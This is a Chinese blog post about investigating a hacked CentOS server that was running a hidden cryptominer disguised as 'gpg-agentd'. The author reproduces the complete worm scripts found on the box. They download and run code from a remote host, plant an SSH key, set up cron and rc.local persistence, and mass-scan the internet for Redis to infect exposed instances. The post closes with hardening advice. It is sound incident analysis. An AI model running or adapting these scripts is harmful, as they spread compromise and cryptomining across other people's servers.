<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>记一次服务器被入侵全过程 | lvbibir's Blog</title><meta name=keywords content="linux"><meta name=description content="周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁"><meta name=author content="
作者:&nbsp;lvbibir"><link rel=canonical href=https://www.lvbibir.cn/posts/tech/record-of-server-attacked/><link crossorigin=anonymous href=/assets/css/stylesheet.0b9ebc1d7ded60d00101b645d2188c55f5e06bdf122a4966066c63abd78b2d0e.css integrity="sha256-C568HX3tYNABAbZF0hiMVfXga98SKklmBmxjq9eLLQ4=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://www.lvbibir.cn/img/avatar.gif><link rel=icon type=image/png sizes=16x16 href=https://www.lvbibir.cn/img/avatar.gif><link rel=icon type=image/png sizes=32x32 href=https://www.lvbibir.cn/img/avatar.gif><link rel=apple-touch-icon href=https://www.lvbibir.cn/img/avatar.gif><link rel=mask-icon href=https://www.lvbibir.cn/img/avatar.gif><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><meta property="og:title" content="记一次服务器被入侵全过程"><meta property="og:description" content="周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁"><meta property="og:type" content="article"><meta property="og:url" content="https://www.lvbibir.cn/posts/tech/record-of-server-attacked/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-01T00:00:00+00:00"><meta property="article:modified_time" content="2021-08-01T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="记一次服务器被入侵全过程"><meta name=twitter:description content="周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"📚 文章","item":"https://www.lvbibir.cn/posts/"},{"@type":"ListItem","position":3,"name":"👨🏻‍💻 技术","item":"https://www.lvbibir.cn/posts/tech/"},{"@type":"ListItem","position":4,"name":"记一次服务器被入侵全过程","item":"https://www.lvbibir.cn/posts/tech/record-of-server-attacked/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"记一次服务器被入侵全过程","name":"记一次服务器被入侵全过程","description":"周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁","keywords":["linux"],"articleBody":"周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，ssh连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名:root，还有不足8位的小白密码，心里一凉：被黑了！\n服务器系统CentOS 6.X，部署了nginx，tomcat，redis等应用，上来先把数据库全备份到本地，然后top命令看了一下，有2个99%的同名进程还在运行，叫gpg-agentd。\ngoogle了一下gpg，结果是：\nGPG提供的gpg-agent提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。\n看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母d，伪装的很好，让人想起来windows上各种看起来像svchost.exe的病毒。继续\nps eho command -p 23374netstat -pan | grep 23374 查看pid:23374进程启动路径和网络状况，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：\n1、文件是怎么上传的？ 2、这个文件的目的是什么，或是黑客想干嘛？\nhistory看一下，记录果然都被清掉了，没留下任何痕迹。继续命令more messages，\n看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。\ncrontab -e 果然，线索找到了。\n上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。\ncurl -fsSL 159.89.190.243/ash.php \u003e ash.sh 脚本内容如下：\nuname -aidhostnamesetenforce 0 2\u003e/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2\u003e/dev/nullrm -rf /var/spool/cron/* 2\u003e/dev/nullmkdir -p /var/spool/cron/crontabs 2\u003e/dev/nullmkdir -p /root/.ssh 2\u003e/dev/nullecho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' \u003e /root/.ssh/authorized_keysecho '*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh' \u003e /var/spool/cron/rootecho '*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh' \u003e /var/spool/cron/crontabs/rootyum install -y bash 2\u003e/dev/nullapt install -y bash 2\u003e/dev/nullapt-get install -y bash 2\u003e/dev/nullbash -c 'curl -fsSL 159.89.190.243/bsh.php|bash' 2\u003e/dev/null 大致分析一下该脚本的主要用途：\n首先是关闭SELinux，解除shell资源访问限制，然后在/root/.ssh/authorized_keys文件中生成ssh公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章SSH原理与运用。接下来安装bash，最后是继续下载第二个脚本bsh.php，并且执行。\n继续下载并分析bsh.pbp，内容如下：\nsleep $( seq 3 7 | sort -R | head -n1 )cd /tmp || cd /var/tmpsleep 1mkdir -p .ICE-unix/... \u0026\u0026 chmod -R 777 .ICE-unix \u0026\u0026 cd .ICE-unix/...sleep 1if [ -f .watch ]; thenrm -rf .watchexit 0fisleep 1echo 1 \u003e .watchsleep 1ps x | awk '!/awk/ \u0026\u0026 /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2\u003e/dev/nullps x | awk '!/awk/ \u0026\u0026 /barad_agent|masscan|.sr0|clay|udevs|.sshd|xig/ {print $1}' | xargs kill -9 2\u003e/dev/nullsleep 1if ! [ -x /usr/bin/gpg-agentd ]; thencurl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.dbecho '/usr/bin/gpg-agentd' \u003e /etc/rc.localecho 'curl -fsSL 159.89.190.243/ash.php|sh' \u003e\u003e /etc/rc.localecho 'exit 0' \u003e\u003e /etc/rc.localfisleep 1chmod +x /usr/bin/gpg-agentd \u0026\u0026 /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentdsleep 1if ! [ -x \"$(command -v masscan)\" ]; thenrm -rf /var/lib/apt/lists/*rm -rf x1.tar.gzif [ -x \"$(command -v apt-get)\" ]; thenexport DEBIAN_FRONTEND=noninteractiveapt-get update -yapt-get install -y debconf-docapt-get install -y build-essentialapt-get install -y libpcap0.8-dev libpcap0.8apt-get install -y libpcap*apt-get install -y make gcc gitapt-get install -y redis-serverapt-get install -y redis-toolsapt-get install -y redisapt-get install -y iptablesapt-get install -y wget curlfiif [ -x \"$(command -v yum)\" ]; thenyum update -yyum install -y epel-releaseyum update -yyum install -y git iptables make gcc redis libpcap libpcap-develyum install -y wget curlfisleep 1curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gzsleep 1[ -f x1.tar.gz ] \u0026\u0026 tar zxf x1.tar.gz \u0026\u0026 cd masscan-1.0.4 \u0026\u0026 make \u0026\u0026 make install \u0026\u0026 cd .. \u0026\u0026 rm -rf masscan-1.0.4fisleep 3 \u0026\u0026 rm -rf .watchbash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2\u003e/dev/null 这段脚本的代码比较长，但主要的功能有4个：\n\\1. 下载远程代码到本地，添加执行权限，chmod u+x。 \\2. 修改rc.local，让本地代码开机自动执行。 \\3. 下载github上的开源扫描器代码，并安装相关的依赖软件，也就是我上面的messages里看到的记录。 \\4. 下载第三个脚本，并且执行。\n我去github上看了下这个开源代码，简直吊炸天。\nMASSCAN: Mass IP port scanner This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, \u003e transmitting 10 million packets per second. It produces results similar to nmap, the most famous port scanner. Internally, it operates more \u003e like scanrand, unicornscan, and ZMap, using asynchronous transmission. The major difference is \u003e that it’s faster than these other scanners. In addition, it’s more flexible, allowing arbitrary \u003e address ranges and port ranges. NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.\ntransmitting 10 million packets per second(每秒发送1000万个数据包)，比nmap速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下readme之后，我也没有细究，继续下载第三个脚本。\nsetenforce 0 2\u003e/dev/nullulimit -n 50000ulimit -u 50000sleep 1iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2\u003e/dev/nulliptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2\u003e/dev/nullsleep 1rm -rf .dat .shard .ranges .lan 2\u003e/dev/nullsleep 1echo 'config set dbfilename \"backup.db\"' \u003e .datecho 'save' \u003e\u003e .datecho 'flushall' \u003e\u003e .datecho 'set backup1 \" */2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'set backup2 \" */3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'set backup3 \" */4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'set backup4 \" */5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'config set dir \"/var/spool/cron/\"' \u003e\u003e .datecho 'config set dbfilename \"root\"' \u003e\u003e .datecho 'save' \u003e\u003e .datecho 'config set dir \"/var/spool/cron/crontabs\"' \u003e\u003e .datecho 'save' \u003e\u003e .datsleep 1masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2\u003e/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq \u003e .shardsleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u003e/dev/null 1\u003e/dev/null \u0026done \u003c .shardsleep 1masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2\u003e/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq \u003e .rangessleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u003e/dev/null 1\u003e/dev/null \u0026done \u003c .rangessleep 1ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2\u003e/dev/null | sed 's//([0-9]{2})//16/g' \u003e .inetsleep 1masscan --max-rate 10000 -p6379,6380 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq \u003e .lansleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u003e/dev/null 1\u003e/dev/null \u0026done \u003c .lansleep 60rm -rf .dat .shard .ranges .lan 2\u003e/dev/null 如果说前两个脚本只是在服务器上下载执行了二进制文件，那这个脚本才真正显示病毒的威力。下面就来分析这个脚本。\n一开始的修改系统环境没什么好说的，接下来的写文件操作有点眼熟，如果用过redis的人，应该能猜到，这里是对redis进行配置。写这个配置，自然也就是利用了redis把缓存内容写入本地文件的漏洞，结果就是用本地的私钥去登陆被写入公钥的服务器了，无需密码就可以登陆，也就是我们文章最开始的/root/.ssh/authorized_keys。登录之后就开始定期执行计划任务，下载脚本。好了，配置文件准备好了，就开始利用masscan进行全网扫描redis服务器，寻找肉鸡，注意看这6379就是redis服务器的默认端口，如果你的redis的监听端口是公网IP或是0.0.0.0，并且没有密码保护，不好意思，你就中招了。\n通过依次分析这3个脚本，就能看出这个病毒的可怕之处，先是通过写入ssh public key 拿到登录权限，然后下载执行远程二进制文件，最后再通过redis漏洞复制，迅速在全网传播，以指数级速度增长。那么问题是，这台服务器是怎么中招的呢？看了下redis.conf，bind的地址是127.0.0.1，没啥问题。由此可以推断，应该是root帐号被暴力破解了，为了验证我的想法，我lastb看了一下，果然有大量的记录：\n还剩最后一个问题，这个gpg-agentd程序到底是干什么的呢？我当时的第一个反应就是矿机，因为现在数字货币太火了，加大了分布式矿机的需求，也就催生了这条灰色产业链。于是，顺手把这个gpg-agentd拖到ida中，用string搜索bitcoin,eth, mine等相关单词，最终发现了这个：\n打开 nicehash.com 看一下，一切都清晰了。\n一、服务器\n\\1. 禁用ROOT \\2. 用户名和密码尽量复杂 \\3. 修改ssh的默认22端口 \\4. 安装DenyHosts防暴力破解软件 \\5. 禁用密码登录，使用RSA公钥登录\n二、redis\n\\1. 禁用公网IP监听，包括0.0.0.0 \\2. 使用密码限制访问redis \\3. 使用较低权限帐号运行redis\n原文链接：https://mp.weixin.qq.com/s/FUv-7-1C30U-A81bDn8dbA\n","wordCount":"2801","inLanguage":"en","datePublished":"2021-08-01T00:00:00Z","dateModified":"2021-08-01T00:00:00Z","author":[{"@type":"Person","name":"lvbibir"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.lvbibir.cn/posts/tech/record-of-server-attacked/"},"publisher":{"@type":"Organization","name":"lvbibir's Blog","logo":{"@type":"ImageObject","url":"https://www.lvbibir.cn/img/avatar.gif"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.lvbibir.cn accesskey=h title="lvbibir's Blog (Alt + H)"><img src=https://www.lvbibir.cn/img/avatar.gif alt aria-label=logo height=35>lvbibir's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.lvbibir.cn/search title="🔍 搜索 (Alt + /)" accesskey=/><span>🔍 搜索</span></a></li><li><a href=https://www.lvbibir.cn/ title="🏡 主页"><span>🏡 主页</span></a></li><li><a href=https://www.lvbibir.cn/posts title="📚 文章"><span>📚 文章</span></a></li><li><a href=https://www.lvbibir.cn/tags title="🏷️ 标签"><span>🏷️ 标签</span></a></li><li><a href=https://www.lvbibir.cn/archives title="📈 时间轴"><span>📈 时间轴</span></a></li><li><a href=https://www.lvbibir.cn/about title="🙋🏻‍♂️ 关于"><span>🙋🏻‍♂️ 关于</span></a></li><li><a href=https://www.lvbibir.cn/links title="🤝 友链"><span>🤝 友链</span></a></li></ul></nav></header><main class="main page"><article class=post-single><div id=single-content><header class=post-header><div class=breadcrumbs><a href=https://www.lvbibir.cn>主页</a>&nbsp;»&nbsp;<a href=https://www.lvbibir.cn/posts/>📚 文章</a>&nbsp;»&nbsp;<a href=https://www.lvbibir.cn/posts/tech/>👨🏻‍💻 技术</a></div><h1 class=post-title>记一次服务器被入侵全过程</h1><div class=post-meta>创建:&nbsp;<span title='2021-08-01 00:00:00 +0000 UTC'>2021-08-01</span>&nbsp;|&nbsp;更新:&nbsp;2021-08-01&nbsp;|&nbsp;字数:&nbsp;2801字&nbsp;|&nbsp;时长:&nbsp;6分钟&nbsp;|&nbsp;
作者:&nbsp;lvbibir
&nbsp;|&nbsp;标签: &nbsp;<ul class=post-tags-meta><a href=https://www.lvbibir.cn/tags/linux/>linux</a></ul><span id=busuanzi_container_page_pv>&nbsp;| 访问: <span id=busuanzi_value_page_pv></span></span></div></header><div class=post-content><p>周一早上刚到办公室，就听到同事说有一台服务器登陆不上了，我也没放在心上，继续边吃早点，边看币价是不是又跌了。不一会运维的同事也到了，气喘吁吁的说：我们有台服务器被阿里云冻结了，理由：对外恶意发包。我放下酸菜馅的包子，ssh连了一下，被拒绝了，问了下默认的22端口被封了。让运维的同事把端口改了一下，立马连上去，顺便看了一下登录名:root，还有不足8位的小白密码，心里一凉：被黑了！</p><p>服务器系统CentOS 6.X，部署了nginx，tomcat，redis等应用，上来先把数据库全备份到本地，然后top命令看了一下，有2个99%的同名进程还在运行，叫gpg-agentd。</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUk13NIsMwEsy0crJQXZ0FlS175qiaaaFRvqibZDicoWJXQgFaIrpZvicQ3Q/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=图片></p><p>google了一下gpg，结果是：</p><blockquote><p>GPG提供的gpg-agent提供了对SSH协议的支持，这个功能可以大大简化密钥的管理工作。</p></blockquote><p>看起来像是一个很正经的程序嘛，但仔细再看看服务器上的进程后面还跟着一个字母d，伪装的很好，让人想起来windows上各种看起来像svchost.exe的病毒。继续</p><pre tabindex=0><code>ps eho command -p 23374netstat -pan | grep 23374
</code></pre><p>查看pid:23374进程启动路径和网络状况，也就是来到了图1的目录，到此已经找到了黑客留下的二进制可执行文件。接下来还有2个问题在等着我：</p><blockquote><p>1、文件是怎么上传的？
2、这个文件的目的是什么，或是黑客想干嘛？</p></blockquote><p>history看一下，记录果然都被清掉了，没留下任何痕迹。继续命令more messages，</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUYxokiaN7XW4UAvKIbbZBrIaOkJ9PszZdJMcrcAeiajCCWk9Puh3Xia5pA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=图片></p><p>看到了在半夜12点左右，在服务器上装了很多软件，其中有几个软件引起了我的注意，下面详细讲。边找边猜，如果我们要做坏事，大概会在哪里做文章，自动启动？定时启动？对，计划任务。</p><pre tabindex=0><code>crontab -e
</code></pre><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUib88hYObUI1R3UaGxYSpDgvbPbB42mOLYBGH9XqCsBQCW7FtjNnVtlg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=图片></p><p>果然，线索找到了。</p><p>上面的计划任务的意思就是每15分钟去服务器上下载一个脚本，并且执行这个脚本。我们把脚本下载下来看一下。</p><pre tabindex=0><code>curl -fsSL 159.89.190.243/ash.php &gt; ash.sh
</code></pre><p>脚本内容如下：</p><pre tabindex=0><code>uname -aidhostnamesetenforce 0 2&gt;/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2&gt;/dev/nullrm -rf /var/spool/cron/* 2&gt;/dev/nullmkdir -p /var/spool/cron/crontabs 2&gt;/dev/nullmkdir -p /root/.ssh 2&gt;/dev/nullecho &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX&#39; &gt; /root/.ssh/authorized_keysecho &#39;*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh&#39; &gt; /var/spool/cron/rootecho &#39;*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh&#39; &gt; /var/spool/cron/crontabs/rootyum install -y bash 2&gt;/dev/nullapt install -y bash 2&gt;/dev/nullapt-get install -y bash 2&gt;/dev/nullbash -c &#39;curl -fsSL 159.89.190.243/bsh.php|bash&#39; 2&gt;/dev/null
</code></pre><p>大致分析一下该脚本的主要用途：</p><blockquote><p>首先是关闭SELinux，解除shell资源访问限制，然后在/root/.ssh/authorized_keys文件中生成ssh公钥，这样每次黑客登录这台服务器就可以免密码登录了，执行脚本就会方便很多，关于ssh keys的文章可以参考这一篇文章SSH原理与运用。接下来安装bash，最后是继续下载第二个脚本bsh.php，并且执行。</p></blockquote><p>继续下载并分析bsh.pbp，内容如下：</p><pre tabindex=0><code>sleep $( seq 3 7 | sort -R | head -n1 )cd /tmp || cd /var/tmpsleep 1mkdir -p .ICE-unix/... &amp;&amp; chmod -R 777 .ICE-unix &amp;&amp; cd .ICE-unix/...sleep 1if [ -f .watch ]; thenrm -rf .watchexit 0fisleep 1echo 1 &gt; .watchsleep 1ps x | awk &#39;!/awk/ &amp;&amp; /redisscan|ebscan|redis-cli/ {print $1}&#39; | xargs kill -9 2&gt;/dev/nullps x | awk &#39;!/awk/ &amp;&amp; /barad_agent|masscan|.sr0|clay|udevs|.sshd|xig/ {print $1}&#39; | xargs kill -9 2&gt;/dev/nullsleep 1if ! [ -x /usr/bin/gpg-agentd ]; thencurl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.dbecho &#39;/usr/bin/gpg-agentd&#39; &gt; /etc/rc.localecho &#39;curl -fsSL 159.89.190.243/ash.php|sh&#39; &gt;&gt; /etc/rc.localecho &#39;exit 0&#39; &gt;&gt; /etc/rc.localfisleep 1chmod +x /usr/bin/gpg-agentd &amp;&amp; /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentdsleep 1if ! [ -x &#34;$(command -v masscan)&#34; ]; thenrm -rf /var/lib/apt/lists/*rm -rf x1.tar.gzif [ -x &#34;$(command -v apt-get)&#34; ]; thenexport DEBIAN_FRONTEND=noninteractiveapt-get update -yapt-get install -y debconf-docapt-get install -y build-essentialapt-get install -y libpcap0.8-dev libpcap0.8apt-get install -y libpcap*apt-get install -y make gcc gitapt-get install -y redis-serverapt-get install -y redis-toolsapt-get install -y redisapt-get install -y iptablesapt-get install -y wget curlfiif [ -x &#34;$(command -v yum)&#34; ]; thenyum update -yyum install -y epel-releaseyum update -yyum install -y git iptables make gcc redis libpcap libpcap-develyum install -y wget curlfisleep 1curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gzsleep 1[ -f x1.tar.gz ] &amp;&amp; tar zxf x1.tar.gz &amp;&amp; cd masscan-1.0.4 &amp;&amp; make &amp;&amp; make install &amp;&amp; cd .. &amp;&amp; rm -rf masscan-1.0.4fisleep 3 &amp;&amp; rm -rf .watchbash -c &#39;curl -fsSL 159.89.190.243/rsh.php|bash&#39; 2&gt;/dev/null
</code></pre><p>这段脚本的代码比较长，但主要的功能有4个：</p><blockquote><p>\1. 下载远程代码到本地，添加执行权限，chmod u+x。
\2. 修改rc.local，让本地代码开机自动执行。
\3. 下载github上的开源扫描器代码，并安装相关的依赖软件，也就是我上面的messages里看到的记录。
\4. 下载第三个脚本，并且执行。</p></blockquote><p>我去github上看了下这个开源代码，简直吊炸天。</p><blockquote><p>MASSCAN: Mass IP port scanner
This is the fastest Internet port
scanner. It can scan the entire Internet in under 6 minutes, >
transmitting 10 million packets per second.
It produces results similar to nmap, the most famous port scanner.
Internally, it operates more > like scanrand, unicornscan, and ZMap,
using asynchronous transmission. The major difference is > that it&rsquo;s
faster than these other scanners. In addition, it&rsquo;s more flexible,
allowing arbitrary > address ranges and port ranges.
NOTE: masscan uses a custom TCP/IP stack. Anything other than simple
port scans will cause conflict with the local TCP/IP stack. This means
you need to either use the -S option to use a separate IP address, or
configure your operating system to firewall the ports that masscan uses.</p></blockquote><p>transmitting 10 million packets per second(每秒发送1000万个数据包)，比nmap速度还要快，这就不难理解为什么阿里云把服务器冻结了，大概看了下readme之后，我也没有细究，继续下载第三个脚本。</p><pre tabindex=0><code>setenforce 0 2&gt;/dev/nullulimit -n 50000ulimit -u 50000sleep 1iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2&gt;/dev/nulliptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2&gt;/dev/nullsleep 1rm -rf .dat .shard .ranges .lan 2&gt;/dev/nullsleep 1echo &#39;config set dbfilename &#34;backup.db&#34;&#39; &gt; .datecho &#39;save&#39; &gt;&gt; .datecho &#39;flushall&#39; &gt;&gt; .datecho &#39;set backup1 &#34;


*/2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;set backup2 &#34;


*/3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;set backup3 &#34;


*/4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;set backup4 &#34;


*/5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;config set dir &#34;/var/spool/cron/&#34;&#39; &gt;&gt; .datecho &#39;config set dbfilename &#34;root&#34;&#39; &gt;&gt; .datecho &#39;save&#39; &gt;&gt; .datecho &#39;config set dir &#34;/var/spool/cron/crontabs&#34;&#39; &gt;&gt; .datecho &#39;save&#39; &gt;&gt; .datsleep 1masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null | awk &#39;{print $6, substr($4, 1, length($4)-4)}&#39; | sort | uniq &gt; .shardsleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;done &lt; .shardsleep 1masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2&gt;/dev/null | awk &#39;{print $6, substr($4, 1, length($4)-4)}&#39; | sort | uniq &gt; .rangessleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;done &lt; .rangessleep 1ip a | grep -oE &#39;([0-9]{1,3}.?){4}/[0-9]{2}&#39; 2&gt;/dev/null | sed &#39;s//([0-9]{2})//16/g&#39; &gt; .inetsleep 1masscan --max-rate 10000 -p6379,6380 -iL .inet | awk &#39;{print $6, substr($4, 1, length($4)-4)}&#39; | sort | uniq &gt; .lansleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;done &lt; .lansleep 60rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
